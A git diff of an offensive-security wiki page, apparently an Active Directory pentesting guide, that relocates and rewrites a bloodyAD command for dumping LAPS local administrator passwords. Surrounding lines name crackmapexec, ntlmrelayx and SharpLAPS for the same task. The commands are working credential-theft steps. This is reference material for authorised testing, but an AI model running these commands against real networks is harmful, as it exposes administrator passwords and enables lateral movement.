@@ -23,6 +23,12 @@ cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps -O co
 Impacket's ntlmrelayx also carries that feature, usable with the `--dump-laps`.
 
 [LAPSDumper](https://github.com/n00py/LAPSDumper) is another Python alternative.
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -42,13 +48,6 @@ Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwd
 
 ```bash
 SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1"
-```
-{% endtab %}
-
-{% tab title="Windows/UNIX-like" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```
 {% endtab %}
 
